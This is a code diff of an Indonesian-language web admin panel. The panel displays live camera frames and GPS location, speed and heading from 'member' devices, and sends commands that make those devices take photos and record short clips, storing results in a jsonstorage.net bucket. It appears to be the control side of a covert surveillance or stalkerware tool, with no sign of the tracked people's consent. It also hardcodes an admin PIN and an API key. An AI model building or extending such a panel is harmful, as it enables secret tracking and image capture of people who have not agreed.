@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Live Pergerakan, Foto & Rekaman</title>
+    <title>Admin Panel - Live View & Lokasi</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
@@ -38,9 +38,7 @@
             background: rgba(34, 197, 94, 0.14); border: 1px solid rgba(34, 197, 94, 0.35);
             padding: 4px 10px; border-radius: 999px; margin-top: 6px;
         }
-        .dot {
-            width: 8px; height: 8px; border-radius: 50%; background: #4ade80;
-        }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80; }
         .actions { display: flex; gap: 10px; flex-wrap: wrap; }
         button {
             padding: 10px 15px; border: none; border-radius: 8px;
@@ -57,29 +55,50 @@
 
         .section-title { font-size: 16px; margin-bottom: 12px; color: #e2e8f0; }
 
-        .live-grid { display: grid; gap: 12px; margin-bottom: 24px; }
-        .live-card {
-            background: #172554; border: 1px solid #1d4ed8;
-            border-radius: 12px; padding: 16px;
-            display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 14px;
-        }
-        .live-card h3 { font-size: 15px; color: #fff; margin-bottom: 5px; }
-        .live-card p { font-size: 12px; color: #bfdbfe; margin-bottom: 3px; }
-        .badge-cam-on {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(34, 197, 94, 0.22); color: #86efac; margin-left: 6px;
-        }
-        .badge-cam-off {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(148, 163, 184, 0.2); color: #cbd5e1; margin-left: 6px;
-        }
-
-        .cmd-panel {
+        /* Layar bergaya Video Call */
+        .call-stage {
             background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 16px; margin-bottom: 24px;
+            border-radius: 14px; padding: 16px; margin-bottom: 22px;
         }
-        .cmd-panel h2 { font-size: 15px; margin-bottom: 10px; }
+        .call-screen {
+            position: relative;
+            width: 100%;
+            max-width: 520px;
+            aspect-ratio: 4 / 3;
+            margin: 0 auto 14px;
+            background: #020617;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #334155;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .call-screen img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .call-overlay-top {
+            position: absolute; top: 10px; left: 10px; right: 10px;
+            display: flex; justify-content: space-between; align-items: center;
+            pointer-events: none;
+        }
+        .tag-live {
+            background: rgba(239, 68, 68, 0.9); color: #fff;
+            font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
+        }
+        .tag-age {
+            background: rgba(15, 23, 42, 0.78); color: #e2e8f0;
+            font-size: 11px; padding: 4px 10px; border-radius: 999px;
+        }
+        .call-meta {
+            background: #0f172a; border: 1px solid #334155;
+            border-radius: 10px; padding: 12px; margin-bottom: 12px;
+            font-size: 12px; color: #cbd5e1;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 10px;
+        }
         .cmd-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
         .cmd-status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
 
@@ -130,8 +149,8 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📍📷 Live Pergerakan & Log Sesi</h1>
-                <div class="live-pill"><span class="dot"></span> Auto-Sync Aktif (tiap 3 detik) • Total Log: <span id="totalCount">0</span></div>
+                <h1>📹 Live View, Pergerakan & Log</h1>
+                <div class="live-pill"><span class="dot"></span> Auto-Sync Aktif • Total Tersimpan: <span id="totalCount">0</span></div>
             </div>
             <div class="actions">
                 <button class="btn-primary" onclick="syncAll(true)">🔄 Sinkron Sekarang</button>
@@ -139,23 +158,34 @@
             </div>
         </div>
 
-        <h2 class="section-title">🛰️ Pergerakan Lokasi Member (Otomatis)</h2>
-        <div id="liveContainer" class="live-grid">
-            <div class="empty-state">Menunggu posisi member...</div>
-        </div>
-
-        <div class="cmd-panel">
-            <h2>Kirim Perintah ke Sesi Member Aktif</h2>
-            <div class="cmd-row">
-                <button class="btn-photo" onclick="sendCommand('PHOTO')">📸 Perintah Ambil Foto</button>
-                <button class="btn-rec" onclick="sendCommand('RECORD')">🎥 Perintah Rekam Klip (4d)</button>
+        <h2 class="section-title">📺 Layar Pantau Realtime (Simulasi Video Call)</h2>
+        <div class="call-stage">
+            <div class="call-screen">
+                <div class="call-overlay-top">
+                    <span class="tag-live" id="liveBadge">MENUNGGU STREAM</span>
+                    <span class="tag-age" id="ageBadge">-</span>
+                </div>
+                <img id="liveFrameImg" src="" alt="Live Stream" style="display:none;">
+                <span id="livePlaceholder" style="color:#64748b;font-size:13px;">Menunggu kamera & lokasi dari perangkat member...</span>
             </div>
-            <div id="cmdStatus" class="cmd-status">Status perintah: Belum ada perintah aktif.</div>
+
+            <div class="call-meta">
+                <div id="liveLocInfo">
+                    <strong>Lokasi:</strong> Belum ada data • <strong>Kecepatan:</strong> - • <strong>Arah:</strong> -
+                </div>
+                <div id="liveMapAction"></div>
+            </div>
+
+            <div class="cmd-row">
+                <button class="btn-photo" onclick="sendCommand('PHOTO')">📸 Ambil Foto Tersimpan</button>
+                <button class="btn-rec" onclick="sendCommand('RECORD')">🎥 Rekam Klip (4d)</button>
+            </div>
+            <div id="cmdStatus" class="cmd-status">Status perintah: Siap mengirim perintah ke perangkat aktif.</div>
         </div>
 
-        <h2 class="section-title">📂 Hasil Foto & Rekaman Masuk</h2>
+        <h2 class="section-title">📂 Hasil Foto & Rekaman Tersimpan</h2>
         <div id="logContainer" class="log-grid">
-            <div class="empty-state">Memuat log...</div>
+            <div class="empty-state">Memuat data...</div>
         </div>
     </div>
 </div>
@@ -164,7 +194,7 @@
     const ADMIN_PIN = "123456";
     const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
     const API_KEY   = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
-    const AUTO_SYNC_MS = 3000;
+    const AUTO_SYNC_MS = 1600;
 
     let syncTimer = null;
     let isFetching = false;
@@ -192,12 +222,12 @@
 
         try {
             const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`);
-            let currentData = { logs: [], livePositions: {} };
+            let currentData = { logs: [], liveSessions: {} };
             if (getRes.ok) {
                 const parsed = await getRes.json();
                 currentData = {
                     logs: Array.isArray(parsed.logs) ? parsed.logs : [],
-                    livePositions: parsed.livePositions && typeof parsed.livePositions === "object" ? parsed.livePositions : {},
+                    liveSessions: parsed.liveSessions && typeof parsed.liveSessions === "object" ? parsed.liveSessions : {},
                     command: parsed.command || {}
                 };
             }
@@ -217,46 +247,57 @@
 
             if (!putRes.ok) throw new Error("Gagal mengirim perintah");
 
-            cmdStatus.textContent = `Perintah ${actionType} terkirim. Hasil akan muncul otomatis setelah selesai diproses member.`;
+            cmdStatus.textContent = `Perintah ${actionType} terkirim. Tunggu beberapa detik hingga hasil masuk ke daftar di bawah.`;
         } catch (err) {
             cmdStatus.textContent = "Gagal mengirim perintah.";
             console.error(err);
         }
     }
 
-    function renderLivePositions(liveObj) {
-        const container = document.getElementById('liveContainer');
-        const entries = Object.values(liveObj || {})
-            .filter(item => item && item.lat !== null && item.lng !== null)
+    function renderLiveStage(liveSessions) {
+        const list = Object.values(liveSessions || {})
+            .filter(item => item && (item.frame || (item.lat !== null && item.lng !== null)))
             .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
 
-        if (entries.length === 0) {
-            container.innerHTML = '<div class="empty-state">Belum ada pergerakan member yang terdeteksi.</div>';
+        const imgEl = document.getElementById('liveFrameImg');
+        const phEl = document.getElementById('livePlaceholder');
+        const liveBadge = document.getElementById('liveBadge');
+        const ageBadge = document.getElementById('ageBadge');
+        const locInfo = document.getElementById('liveLocInfo');
+        const mapAction = document.getElementById('liveMapAction');
+
+        if (list.length === 0) {
+            imgEl.style.display = "none";
+            phEl.style.display = "block";
+            liveBadge.textContent = "MENUNGGU STREAM";
+            ageBadge.textContent = "-";
+            locInfo.innerHTML = "<strong>Lokasi:</strong> Belum ada data • <strong>Kecepatan:</strong> - • <strong>Arah:</strong> -";
+            mapAction.innerHTML = "";
             return;
         }
 
-        container.innerHTML = entries.map(item => {
-            const ageSec = item.updatedAt ? Math.max(0, Math.round((Date.now() - item.updatedAt) / 1000)) : null;
-            const statusText = ageSec !== null ? `${ageSec}d lalu` : (item.waktu || "-");
-            const camBadge = item.kameraAktif
-                ? `<span class="badge-cam-on">Kamera Aktif</span>`
-                : `<span class="badge-cam-off">Kamera Belum Aktif</span>`;
+        const active = list[0];
+        const ageSec = active.updatedAt ? Math.max(0, Math.round((Date.now() - active.updatedAt) / 1000)) : null;
+        const isFresh = ageSec !== null && ageSec <= 8;
 
-            return `
-                <div class="live-card">
-                    <div>
-                        <h3>${escapeHtml(item.nama || "Member")} ${camBadge}</h3>
-                        <p>🌐 <strong>Koordinat:</strong> ${item.lat}, ${item.lng} • <strong>Akurasi:</strong> ${escapeHtml(item.akurasi || "-")}</p>
-                        <p>🧭 <strong>Kecepatan:</strong> ${escapeHtml(item.kecepatan || "-")} • <strong>Arah:</strong> ${escapeHtml(item.arah || "-")} • <strong>Update:</strong> ${escapeHtml(statusText)}</p>
-                    </div>
-                    <div>
-                        <a class="btn-map" href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank">
-                            Buka di Google Maps ↗
-                        </a>
-                    </div>
-                </div>
-            `;
-        }).join('');
+        liveBadge.textContent = isFresh ? "LIVE" : "TERAKHIR";
+        ageBadge.textContent = ageSec !== null ? `Update ${ageSec}d lalu` : (active.waktu || "-");
+
+        if (typeof active.frame === "string" && active.frame.startsWith("data:image/")) {
+            imgEl.src = active.frame;
+            imgEl.style.display = "block";
+            phEl.style.display = "none";
+        }
+
+        const hasCoords = active.lat !== null && active.lat !== undefined && active.lng !== null && active.lng !== undefined;
+        locInfo.innerHTML = `
+            <strong>Lokasi:</strong> ${hasCoords ? `${active.lat}, ${active.lng}` : "Tidak ada"} (${escapeHtml(active.akurasi || "-")}) •
+            <strong>Kecepatan:</strong> ${escapeHtml(active.kecepatan || "-")} •
+            <strong>Arah:</strong> ${escapeHtml(active.arah || "-")}
+        `;
+        mapAction.innerHTML = hasCoords
+            ? `<a class="btn-map" href="https://www.google.com/maps?q=${active.lat},${active.lng}" target="_blank">Buka Maps ↗</a>`
+            : "";
     }
 
     function renderLogs(logs) {
@@ -264,7 +305,7 @@
         document.getElementById('totalCount').textContent = logs.length;
 
         if (!logs || logs.length === 0) {
-            container.innerHTML = '<div class="empty-state">Belum ada foto atau rekaman yang masuk.</div>';
+            container.innerHTML = '<div class="empty-state">Belum ada foto atau rekaman tersimpan.</div>';
             return;
         }
 
@@ -322,11 +363,11 @@
             if (!res.ok) throw new Error("Gagal mengambil data");
 
             const data = await res.json();
-            renderLivePositions(data.livePositions || {});
+            renderLiveStage(data.liveSessions || {});
             renderLogs(Array.isArray(data.logs) ? data.logs : []);
         } catch (err) {
             if (showLoading) {
-                document.getElementById('liveContainer').innerHTML = '<div class="empty-state" style="color:#f87171;">Gagal menyinkronkan data.</div>';
+                document.getElementById('livePlaceholder').textContent = "Gagal menyinkronkan data.";
             }
             console.error(err);
         } finally {
@@ -343,14 +384,14 @@
             if (getRes.ok) {
                 const parsed = await getRes.json();
                 if (parsed && parsed.command) currentCmd = parsed.command;
-                if (parsed && parsed.livePositions) currentLive = parsed.livePositions;
+                if (parsed && parsed.liveSessions) currentLive = parsed.liveSessions;
             }
 
             const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
             const res = await fetch(putUrl, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ logs: [], livePositions: currentLive, command: currentCmd })
+                body: JSON.stringify({ logs: [], liveSessions: currentLive, command: currentCmd })
             });
             if (res.ok) {
                 syncAll(true);
